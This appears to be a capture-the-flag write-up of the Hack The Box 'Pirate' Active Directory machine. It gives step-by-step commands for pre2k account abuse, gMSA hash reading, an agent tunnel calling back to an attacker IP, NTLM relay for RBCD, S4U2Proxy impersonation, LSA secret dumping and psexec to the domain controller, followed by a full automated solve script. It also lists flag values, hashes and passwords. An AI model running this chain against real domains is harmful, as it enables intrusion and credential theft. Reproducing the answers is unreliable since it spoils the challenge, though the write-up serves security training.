# Pirate (HTB Machine)

## Summary

Pirate is a Windows Server 2019 Active Directory box. Starting creds are `pentest / p3nt3st2025!&`. The chain covers **pre-Windows 2000 machine account abuse** on `MS01$` and `EXCH01$`, **gMSA password retrieval** as `MS01$` (member of Domain Secure Servers), **RBCD via NTLM relay** (Coercer → ntlmrelayx `--delegate-access`) granting `MS01$` delegation rights over `WEB01$`, **S4U2Proxy** to impersonate Administrator on WEB01, **LSA secrets dump** recovering `a.white`'s cleartext password, **WriteSPN abuse** as `a.white_adm` to set SPNs on `WEB01$` and `DC01$`, and a final **S4U2Proxy + altservice** ticket to get CIFS on DC01 as Administrator.

`MS01$` pre-created machine account (password = `ms01`) is exploited to read both gMSA NTLMs. `gMSA_ADCS_prod$` has WinRM access to DC01 and is used to coerce `WEB01$` auth to relay for RBCD. `MS01$` then impersonates Administrator on WEB01 via S4U2Proxy. secretsdump on WEB01 recovers `a.white`'s cleartext password from LSA secrets and `a.white_adm`'s existence. After resetting `a.white_adm`'s password, WriteSPN on `DC01$` enables S4U2Proxy to CIFS/DC01 as Administrator for the root flag.

**Hint:** Use `ft.sh` wrapper to auto-sync clock before Kerberos ops. Set up ligolo-ng tunnel through DC01 to reach internal `192.168.100.0/24` subnet (WEB01 at `192.168.100.2`). NTLM relay requires `--remove-mic` and `--delegate-access --escalate-user MS01$`.

## Flags

| Flag | Path | Value |
|------|------|-------|
| User | `C:\Users\a.white\Desktop\user.txt` (read via WinRM as WEB01 Administrator) | `9e6c2e6e2f641699419b46ac0a6ed4bc` |
| Root | `C:\Users\Administrator\Desktop\root.txt` (psexec as Administrator on DC01) | `c2ea42ca342f3e7360de75d5ab136b9c` |

## Artifacts

| Item | Value |
|------|-------|
| Domain | `pirate.htb` |
| DC hostname | `DC01.pirate.htb` (`10.129.107.108`) |
| Internal subnet | `192.168.100.0/24` (WEB01 at `192.168.100.2`) |
| Starting creds | `pentest / p3nt3st2025!&` |
| WinRM | TCP 5985 |
| Pre-created accounts | `MS01$` (pass=`ms01`), `EXCH01$` (pass=`exch01`) |
| gMSA accounts | `gMSA_ADCS_prod$`, `gMSA_ADFS_prod$` (both: PrincipalsAllowedToRead = Domain Secure Servers) |
| `gMSA_ADCS_prod$` NTLM | `55d78485f8d9b2d2b37628227ebf936a` |
| `gMSA_ADFS_prod$` NTLM | `abad63faa669b6a4eddfd46432f7ca6c` |
| `a.white` cleartext | `E2nvAOKSz5Xz2MJu` (LSA secrets on WEB01) |
| `a.white_adm` reset pass | `WhoKnows123!` (attacker-set) |
| WEB01 local Admin NTLM | `b1aac1584c2ea8ed0a9429684e4fc3e5` |
| Tunnel tool | ligolo-ng (`proxy` + `agent.exe`) |
| `/etc/hosts` | `<IP> pirate.htb DC01.pirate.htb` |
| Clock sync | `ft.sh` wrapper auto-syncs to DC time |

## Recon

```bash
nmap -sC -sV -p- --min-rate 5000 -T4 <IP>
nxc smb <IP> -u pentest -p 'p3nt3st2025!&' --rid-brute
nxc ldap <IP> -u pentest -p 'p3nt3st2025!&' --gmsa
nxc ldap <IP> -u pentest -p 'p3nt3st2025!&' --query "(samAccountType=805306369)" "sAMAccountName userAccountControl"
./ft.sh nxc ldap <IP> -u pentest -p 'p3nt3st2025!&' -d pirate.htb -M pre2k
```

Key ports: 53, 88, 135, 139, 389, 445, 5985, 3268.

### Computers

| Account | UAC | Notes |
|---------|-----|-------|
| `DC01$` | 532480 | Domain Controller |
| `WEB01$` | 4096 | Internal host; `192.168.100.2` |
| `MS01$` | 4128 | Pre-created (password = `ms01`) |
| `EXCH01$` | 4128 | Pre-created (password = `exch01`) |
| `gMSA_ADCS_prod$` | 4096 | gMSA; readable by Domain Secure Servers |
| `gMSA_ADFS_prod$` | 4096 | gMSA; readable by Domain Secure Servers |

### Key users

| Account | Groups | Role |
|---------|--------|------|
| `pentest` | — | Starting account; enum only |
| `a.white` | — | Cleartext in WEB01 LSA secrets; owns `a.white_adm` |
| `a.white_adm` | IT | WriteSPN on `WEB01$` and `DC01$` |
| `MS01$` | Domain Secure Servers (via pre2k) | Reads both gMSA NTLMs |
| `gMSA_ADCS_prod$` | — | WinRM on DC01; used to coerce WEB01 |

### ACL / delegation edges

```
MS01$            --pre2k TGT-->     pirate.htb (Domain Secure Servers member)
MS01$            --GMSA read-->     gMSA_ADCS_prod$, gMSA_ADFS_prod$
gMSA_ADCS_prod$  --WinRM-->         DC01 (lateral to internal net)
ntlmrelayx relay --delegate-access--> MS01$ rbcd over WEB01$
MS01$            --S4U2Proxy-->     Administrator@cifs/WEB01.pirate.htb
a.white_adm      --WriteSPN-->      WEB01$, DC01$
a.white_adm      --S4U2Proxy-->     Administrator@CIFS/DC01.pirate.htb (altservice)
```

## Lateral movement — pentest → MS01$ (pre2k)

`MS01$` and `EXCH01$` were created with pre-Windows 2000 compatibility (password = lowercase machine name). The `pre2k` nxc module obtains TGTs for both.

```bash
./ft.sh nxc ldap <IP> -u pentest -p 'p3nt3st2025!&' -d pirate.htb -M pre2k
# TGTs saved to /home/kali/.nxc/modules/pre2k/ccache/
export KRB5CCNAME=/home/kali/.nxc/modules/pre2k/ccache/ms01@pirate.htb.ccache
```

## gMSA retrieval — MS01$ → gMSA_ADCS_prod$ / gMSA_ADFS_prod$

`MS01$` is a member of **Domain Secure Servers** (PrincipalsAllowedToReadPassword for both gMSAs).

```bash
./ft.sh nxc ldap <IP> -u 'MS01$' -p 'ms01' -d pirate.htb --gmsa -k
# gMSA_ADCS_prod$  NTLM: 55d78485f8d9b2d2b37628227ebf936a
# gMSA_ADFS_prod$  NTLM: abad63faa669b6a4eddfd46432f7ca6c
```

## Tunnel — gMSA_ADCS_prod$ → internal subnet via ligolo-ng

`gMSA_ADCS_prod$` has WinRM on DC01. Use it to drop the ligolo agent and reach `192.168.100.0/24`.

```bash
# attacker
./proxy -selfcert -laddr 0.0.0.0:11601

# on DC01 via evil-winrm as gMSA_ADCS_prod$
evil-winrm -i <IP> -u 'gMSA_ADCS_prod$' -H '55d78485f8d9b2d2b37628227ebf936a'
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

# ligolo-ng console
session → 1
start
# add route: sudo ip route add 192.168.100.0/24 dev ligolo
```

## RBCD — NTLM relay → MS01$ delegation over WEB01$

Coerce `WEB01$` (internal) to authenticate to attacker; relay to LDAPS on DC01 to write RBCD granting `MS01$` delegation rights over `WEB01$`.

```bash
# terminal 1 — relay
./ft.sh ntlmrelayx.py -t ldaps://<IP> \
  --delegate-access --escalate-user 'MS01$' \
  -smb2support --remove-mic

# terminal 2 — coerce (through ligolo tunnel, targeting WEB01 internal IP)
./ft.sh coercer coerce \
  -u 'gMSA_ADCS_prod$' --hashes ':55d78485f8d9b2d2b37628227ebf936a' \
  -d pirate.htb -l <ATTACKER_IP> -t 192.168.100.2 --always-continue
```

## S4U2Proxy — MS01$ → Administrator@WEB01

```bash
export KRB5CCNAME=/home/kali/.nxc/modules/pre2k/ccache/ms01.ccache
./ft.sh getST.py pirate.htb/'MS01$' \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate Administrator \
  -dc-ip <IP> -k -no-pass
# ticket: Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

## secretsdump — WEB01 → a.white cleartext + user flag

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
./ft.sh secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
# LSA: PIRATE\a.white:E2nvAOKSz5Xz2MJu (DefaultPassword)
# WEB01 local Admin NTLM: b1aac1584c2ea8ed0a9429684e4fc3e5

# user flag (via WinRM on WEB01)
evil-winrm -i 192.168.100.2 -u 'Administrator' -H 'b1aac1584c2ea8ed0a9429684e4fc3e5'
type C:\Users\a.white\Desktop\user.txt
```

## WriteSPN abuse — a.white_adm → S4U2Proxy to DC01

`a.white` can reset `a.white_adm`'s password. `a.white_adm` has WriteSPN on both `WEB01$` and `DC01$`.

```bash
# reset a.white_adm password
bloodyAD -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host <IP> \
  set password 'a.white_adm' 'WhoKnows123!'

# add SPNs
./ft.sh bloodyAD -u 'a.white_adm' -p 'WhoKnows123!' -d pirate.htb --host <IP> \
  set object 'WEB01$' servicePrincipalName -v 'HTTP/WEB01'
./ft.sh bloodyAD -u 'a.white_adm' -p 'WhoKnows123!' -d pirate.htb --host <IP> \
  set object 'DC01$' servicePrincipalName -v 'HTTP/WEB01.pirate.htb'

# S4U2Proxy with altservice → CIFS on DC01
./ft.sh impacket-getST \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  pirate.htb/a.white_adm:'WhoKnows123!' \
  -dc-ip <IP> \
  -altservice 'CIFS/DC01.pirate.htb'
# ticket: Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

## Root — psexec as Administrator on DC01

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
./ft.sh impacket-psexec -k -no-pass DC01.pirate.htb
type C:\Users\Administrator\Desktop\root.txt
```

## Dead ends

| Approach | Result |
|----------|--------|
| `pentest` → gMSA read direct | `<no read permissions>` — not in Domain Secure Servers |
| `EXCH01$` for gMSA | Also works but `MS01$` is sufficient |
| `gMSA_ADFS_prod$` WinRM | Did not yield shell; `gMSA_ADCS_prod$` used instead |
| SeBackup / NTDS dump on DC01 | Not needed; altservice ticket gives full psexec |
| `a.white_adm` password reset without `a.white` cleartext | No path; cleartext comes from WEB01 LSA secrets |

## Automated solve

Prerequisites: `nxc` (with `pre2k` module), `impacket`, `bloodyAD`, `coercer`, `ligolo-ng` (`proxy` + `agent.exe`).

```bash
cd machine/pirate

# 1. hosts + clock
echo '<IP> pirate.htb DC01.pirate.htb' | sudo tee -a /etc/hosts

# 2. pre2k → MS01$ TGT
./ft.sh nxc ldap <IP> -u pentest -p 'p3nt3st2025!&' -d pirate.htb -M pre2k
export KRB5CCNAME=/home/kali/.nxc/modules/pre2k/ccache/ms01@pirate.htb.ccache

# 3. gMSA → ADCS_prod hash
./ft.sh nxc ldap <IP> -u 'MS01$' -p 'ms01' -d pirate.htb --gmsa -k
ADCS_HASH=55d78485f8d9b2d2b37628227ebf936a

# 4. ligolo tunnel (manual: run proxy, evil-winrm, drop agent, start session)

# 5. RBCD relay + coerce (two terminals)
./ft.sh ntlmrelayx.py -t ldaps://<IP> --delegate-access --escalate-user 'MS01$' -smb2support --remove-mic &
./ft.sh coercer coerce -u 'gMSA_ADCS_prod$' --hashes ":$ADCS_HASH" \
  -d pirate.htb -l <ATTACKER_IP> -t 192.168.100.2 --always-continue

# 6. S4U2Proxy → WEB01 Admin
export KRB5CCNAME=/home/kali/.nxc/modules/pre2k/ccache/ms01.ccache
./ft.sh getST.py pirate.htb/'MS01$' -spn 'cifs/WEB01.pirate.htb' \
  -impersonate Administrator -dc-ip <IP> -k -no-pass
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

# 7. secretsdump → a.white cleartext
./ft.sh secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb

# 8. WriteSPN + altservice → DC01 Admin
bloodyAD -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host <IP> \
  set password 'a.white_adm' 'WhoKnows123!'
./ft.sh bloodyAD -u 'a.white_adm' -p 'WhoKnows123!' -d pirate.htb --host <IP> \
  set object 'WEB01$' servicePrincipalName -v 'HTTP/WEB01'
./ft.sh bloodyAD -u 'a.white_adm' -p 'WhoKnows123!' -d pirate.htb --host <IP> \
  set object 'DC01$' servicePrincipalName -v 'HTTP/WEB01.pirate.htb'
./ft.sh impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' \
  pirate.htb/a.white_adm:'WhoKnows123!' -dc-ip <IP> -altservice 'CIFS/DC01.pirate.htb'
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

# 9. psexec → root flag
./ft.sh impacket-psexec -k -no-pass DC01.pirate.htb
```

Resume flags (manual): re-export the relevant `KRB5CCNAME` ccache and pick up from the corresponding step.

## Methodology notes

- `pre2k` module in nxc is the cleanest way to obtain TGTs for pre-Windows 2000 machine accounts — no standalone binary needed.
- `MS01$`'s membership in **Domain Secure Servers** is the key to reading both gMSA NTLMs; `pentest` alone gets `<no read permissions>`.
- ligolo-ng is essential — WEB01 is internal-only; coercion and WinRM on `192.168.100.2` require the tunnel.
- RBCD relay needs `--remove-mic` (MIC bypass) and `--delegate-access --escalate-user MS01$`; without `--escalate-user` the relay creates a new account instead.
- `a.white`'s cleartext appears in `DefaultPassword` under LSA secrets on WEB01, not in NTDS — secretsdump on the domain controller is unnecessary.
- WriteSPN on `DC01$` (adding `HTTP/WEB01.pirate.htb`) enables `a.white_adm` to S4U2Proxy through `WEB01$`'s delegation chain; `-altservice` rewrites to `CIFS/DC01` for psexec.
- Root flag is on `Administrator\Desktop` on DC01, not on any other account.

## Constant derivation

| Constant | Value | Derivation |
|----------|-------|------------|
| `PENTEST_PASS` | `p3nt3st2025!&` | HTB starting creds |
| `MS01_PASS` | `ms01` | pre-Windows 2000 default (lowercase machine name) |
| `EXCH01_PASS` | `exch01` | pre-Windows 2000 default |
| `ADCS_HASH` | `55d78485f8d9b2d2b37628227ebf936a` | `nxc ldap --gmsa` as `MS01$` |
| `ADFS_HASH` | `abad63faa669b6a4eddfd46432f7ca6c` | `nxc ldap --gmsa` as `MS01$` |
| `WEB01_ADMIN_HASH` | `b1aac1584c2ea8ed0a9429684e4fc3e5` | secretsdump SAM on WEB01 |
| `A_WHITE_PASS` | `E2nvAOKSz5Xz2MJu` | LSA DefaultPassword on WEB01 |
| `A_WHITE_ADM_PASS` | `WhoKnows123!` | attacker-set via bloodyAD |
| `ATTACKER_IP` | `tun0` address | `ip -4 addr show tun0` |
| `WEB01_IP` | `192.168.100.2` | internal subnet (via ligolo tunnel) |

## Files in this folder

- `writeup.md` — this write-up
- `ft.sh` — clock-sync wrapper for impacket/nxc Kerberos commands
- `proxy` — ligolo-ng proxy binary (attacker-side)
- `agent.exe` — ligolo-ng agent (dropped on DC01 as `gMSA_ADCS_prod$`)
